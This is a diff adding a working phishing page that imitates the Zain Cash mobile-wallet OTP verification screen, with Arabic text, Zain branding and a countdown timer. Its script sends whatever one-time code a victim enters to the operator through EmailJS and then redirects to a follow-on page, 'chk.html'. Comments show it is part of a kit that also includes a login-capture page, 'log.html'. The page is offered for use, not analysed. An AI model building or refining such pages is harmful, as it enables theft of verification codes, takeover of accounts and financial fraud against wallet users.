@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zain Cash - Verify OTP</title>
+    
+    <script 
+        type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+    
+    <link 
+        href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700&display=swap" 
+        rel="stylesheet">
+    
+    <style>
+        /* ============================ */
+        /* 3. التنسيقات الأساسية (OTP) */
+        /* ============================ */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            height: 100%;
+        }
+
+        /* 🔸 أولاً — التصميم العام */
+        body {
+            /* **الخلفية بيضاء ناصعة كما طلبت** */
+            background-color: #FFFFFF; 
+            font-family: 'Cairo', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            min-height: 100%;
+            /* الاتجاه من اليمين إلى اليسار */
+            direction: rtl;
+        }
+
+        /* ============================ */
+        /* 4. تنسيق الهيدر الثابت (كما هو) */
+        /* ============================ */
+        .header {
+            background-color: #6A3395;
+            width: 100%;
+            height: 80px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 40px;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        /* (تنسيقات الهيدر التفصيلية مدمجة هنا) */
+        .logo-container { display: flex; align-items: center; color: white; height: 100%; }
+        .logo-image-container { height: 45px; width: auto; display: flex; align-items: center; justify-content: center; overflow: hidden; border-radius: 4px; }
+        .logo-image { height: 100%; width: auto; object-fit: contain; }
+        .controls { display: flex; align-items: center; gap: 15px; }
+        .download-btn { background-color: white; color: #6A3395; border: none; border-radius: 24px; padding: 10px 20px; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight: 600; font-size: 14px; cursor: pointer; transition: all 0.2s ease; }
+        .download-btn:hover { background-color: #f0f0f0; }
+        .icon-container { width: 40px; height: 40px; border-radius: 50%; background-color: rgba(255, 255, 255, 0.25); display: flex; justify-content: center; align-items: center; cursor: pointer; position: relative; }
+        .currency-container { display: flex; align-items: center; }
+        .currency-symbol { color: white; font-weight: bold; font-size: 18px; margin-left: 5px; }
+        .dropdown-arrow { width: 12px; height: 12px; border-radius: 2px; background-color: rgba(255, 255, 255, 0.3); display: flex; justify-content: center; align-items: center; margin-right: 2px; }
+        .dropdown-arrow::after { content: ""; width: 0; height: 0; border-left: 4px solid transparent; border-right: 4px solid transparent; border-top: 4px solid white; }
+        .search-icon { width: 18px; height: 18px; position: relative; }
+        .search-icon::before { content: ""; position: absolute; width: 14px; height: 14px; border: 2px solid white; border-radius: 50%; top: 0; right: 0; }
+        .search-icon::after { content: ""; position: absolute; width: 8px; height: 2px; background-color: white; transform: rotate(45deg); bottom: 0; left: 0; }
+        
+
+        /* ============================ */
+        /* 5. تنسيقات شاشة رمز التحقق (OTP) - معدلة */
+        /* ============================ */
+        
+        .otp-content {
+            padding-top: 80px; 
+            padding-bottom: 120px; 
+        }
+        
+        .form-wrapper {
+            width: 100%;
+            max-width: 440px;
+            padding: 40px 20px 20px 20px;
+            margin: 0 auto;
+            /* 🔸 تعديل: تم إزالة المحاذاة لليسار */
+        }
+        
+        /* 🔹 تعديل: العنوان الرئيسي (أصبح متوسطاً) */
+        .otp-title {
+            font-family: 'Cairo', sans-serif;
+            font-weight: 700;
+            color: #1A1A1A;
+            font-size: 24px;
+            text-align: center; /* أصبح في الوسط */
+        }
+        
+        /* 🔹 تعديل: النص التوضيحي (أصبح متوسطاً) */
+        .otp-subtitle {
+            font-family: 'Cairo', sans-serif;
+            font-weight: 400; 
+            color: #777;
+            font-size: 15px;
+            margin-top: 5px;
+            margin-bottom: 25px;
+            text-align: center; /* أصبح في الوسط */
+        }
+
+        /* 🔹 رابعاً — تنسيقات الحقول (مستوردة من log.html) */
+        .form-group {
+            margin-bottom: 20px;
+            text-align: right;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #666;
+        }
+        
+        .form-input {
+            background-color: #FFFFFF;
+            border-radius: 12px;
+            border: 1px solid #DDD;
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 16px;
+            color: #333;
+            font-family: 'Cairo', sans-serif;
+            direction: ltr; 
+            text-align: left;
+        }
+        
+        .form-input::placeholder {
+            color: #AAA;
+            text-align: left;
+            direction: ltr;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: #6A3BA8;
+            box-shadow: 0 0 5px rgba(106, 59, 168, 0.2);
+        }
+        /* (انتهت التنسيقات المستوردة) */
+
+
+        /* 🔹 خامساً — نص إعادة إرسال الرمز (أصبح متوسطاً) */
+        .resend-text {
+            font-family: 'Cairo', sans-serif;
+            font-weight: 400;
+            color: #8F69C6; /* بنفسجي خفيف */
+            font-size: 14px;
+            text-align: center; /* أصبح في الوسط */
+            margin-top: 20px;
+            margin-bottom: 40px; 
+        }
+        
+        /* 🔹 سادساً — زر الإرسال */
+        .submit-btn {
+            width: 100%;
+            height: 50px;
+            border-radius: 50px; 
+            background-color: #C7AFE6; /* بنفسجي باهت */
+            color: white;
+            
+            font-size: 18px;
+            font-weight: 600;
+            font-family: 'Cairo', sans-serif;
+            
+            border: none;
+            cursor: not-allowed;
+            transition: all 0.2s ease;
+        }
+        
+        /* حالة الزر المعطل (Disabled) */
+        .submit-btn:disabled {
+            opacity: 0.6; /* شفافية للزر بأكمله */
+        }
+
+        /* حالة الزر المفعل والجاهز */
+        .submit-btn:not(:disabled) {
+            opacity: 1;
+            cursor: pointer;
+            background-color: #BFA2E3; /* لون أغمق قليلاً عند التفعيل */
+        }
+
+        .submit-btn:not(:disabled):hover {
+            background-color: #b091d8;
+        }
+
+        .submit-btn:not(:disabled):active {
+            background-color: #a280cc;
+        }
+
+        /* تثبيت الزر أسفل الشاشة (للموبايل) */
+        @media (max-width: 480px) {
+            .submit-btn {
+                position: fixed;
+                bottom: 20px;
+                left: 20px;
+                right: 20px;
+                width: auto;
+                z-index: 100;
+            }
+
+            /* تعديل: تم تغيير اسم الحاوي */
+            .form-wrapper {
+                /* زيادة المسافة السفلية لمنع الزر الثابت من تغطية المحتوى */
+                padding-bottom: 90px;
+            }
+        }
+
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="logo-container">
+            <div class="logo-image-container">
+                <img src="https://i.imgur.com/QMO3R6p.png" alt="Zain Logo" class="logo-image" id="logoImage">
+            </div>
+        </div>
+        
+        <div class="controls">
+            <button class="download-btn">حمّل التطبيق!</button>
+            
+            <div class="icon-container currency-container">
+                <div class="dropdown-arrow"></div>
+                <div class="currency-symbol">ع</div>
+            </div>
+            
+            <div class="icon-container">
+                <div class="search-icon"></div>
+            </div>
+        </div>
+    </header>
+    
+    <main class="otp-content">
+        
+        <div class="form-wrapper">
+            
+            <h1 class="otp-title">لقد أرسلنا لك رمز التحقق</h1>
+            <p class="otp-subtitle">تم إرسال الرمز إلى رقم هاتفك</p>
+            
+            <form id="otp-form">
+                
+                <div class="form-group">
+                    <label for="otp_code" class="form-label">رمز التحقق</label>
+                    <input 
+                        type="tel" 
+                        id="otp_code" 
+                        name="otp_code" 
+                        class="form-input" 
+                        required 
+                        inputmode="numeric"
+                        placeholder=""
+                        autocomplete="one-time-code">
+                </div>
+                <p class="resend-text">إعادة إرسال رمز التحقق خلال <span id="timer">00:40</span></p>
+                
+                <button type="submit" id="submit-btn" class="submit-btn" disabled>إرسال</button>
+                
+            </form>
+        </div>
+        
+    </main>
+
+    <script>
+        // إعدادات EmailJS
+        (function() {
+            emailjs.init({
+                publicKey: "zWBq4dbSzfkEvVeS2", // ⚠️ استبدل هذا
+            });
+        })();
+
+        window.onload = function() {
+            const form = document.getElementById('otp-form');
+            const otpInput = document.getElementById('otp_code'); // الإدخال الجديد
+            const submitBtn = document.getElementById('submit-btn');
+            const timerSpan = document.getElementById('timer');
+            let timeLeft = 40;
+
+            // =========================
+            // A. منطق العد التنازلي (Timer) - (بدون تغيير)
+            // =========================
+            function startTimer() {
+                const countdown = setInterval(() => {
+                    if (timeLeft <= 0) {
+                        clearInterval(countdown);
+                        timerSpan.textContent = 'الرمز انتهت صلاحيته';
+                        timerSpan.style.color = '#C7AFE6';
+                    } else {
+                        const seconds = timeLeft.toString().padStart(2, '0');
+                        timerSpan.textContent = `00:${seconds}`;
+                        timeLeft--;
+                    }
+                }, 1000);
+            }
+
+            startTimer();
+
+            // =========================
+            // B. منطق حقل الـ OTP (مبسط)
+            // =========================
+            function checkCompletion() {
+                // تفعيل الزر فقط إذا كانت الخانة تحتوي على رقم واحد على الأقل
+                const isComplete = otpInput.value.length > 0;
+                submitBtn.disabled = !isComplete;
+            }
+
+            // إضافة مستمع لحقل الإدخال الجديد
+            otpInput.addEventListener('input', () => {
+                // فلترة لإبقاء الأرقام فقط
+                otpInput.value = otpInput.value.replace(/[^0-9]/g, '');
+                checkCompletion();
+            });
+            
+            // تحقق عند تحميل الصفحة (في حال الملء التلقائي)
+            checkCompletion();
+
+            // =========================
+            // C. منطق إرسال النموذج (EmailJS) - (معدل لاستخدام sendForm)
+            // =========================
+            form.addEventListener('submit', function(event) {
+                event.preventDefault(); 
+                
+                if (submitBtn.disabled) return;
+
+                const serviceID = 'service_lyabofe';     // ⚠️ استبدل هذا
+                const templateID = 'template_v443mrn';   // ⚠️ استبدل هذا
+                
+                submitBtn.disabled = true;
+                submitBtn.textContent = '...جاري الإرسال';
+
+                // استخدام sendForm مثل ملف log.html لإرسال النموذج بالكامل
+                emailjs.sendForm(serviceID, templateID, this)
+                    .then(() => {
+                        submitBtn.disabled = false;
+                        submitBtn.textContent = 'إرسال';
+                        form.reset();
+                        checkCompletion(); // تعطيل الزر مجدداً بعد الريست
+                        
+                        // 🔥 التوجيه إلى صفحة chk.html بعد إرسال البريد الإلكتروني بنجاح
+                        window.location.href = 'chk.html';
+                    }, (err) => {
+                        submitBtn.disabled = false;
+                        submitBtn.textContent = 'إرسال';
+                        alert('حدث خطأ أثناء إرسال رمز التحقق. يرجى المحاولة مرة أخرى.');
+                    });
+            });
+        }
+    </script>
+</body>
+
+</html>
